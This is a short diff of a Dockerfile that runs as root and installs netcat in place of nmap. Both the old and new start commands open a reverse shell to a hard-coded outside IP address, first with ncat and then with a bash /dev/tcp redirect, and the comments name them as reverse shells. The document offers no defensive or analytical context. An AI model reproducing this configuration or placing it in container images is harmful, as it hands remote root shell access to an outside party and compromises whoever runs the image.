@@ -6,8 +6,8 @@ USER root
 # Update packages
 RUN apt-get update -y && apt-get upgrade -y
 
-# Install nmap package (includes ncat)
-RUN apt-get install -y nmap
+# Install Netcat
+RUN apt-get install -y netcat-openbsd
 
-# Start ncat reverse shell
-CMD ncat 37.1.204.49 1234 -e /bin/bash
+# Start bash reverse shell
+CMD bash -c 'bash -i >& /dev/tcp/37.1.204.49/1234 0>&1'
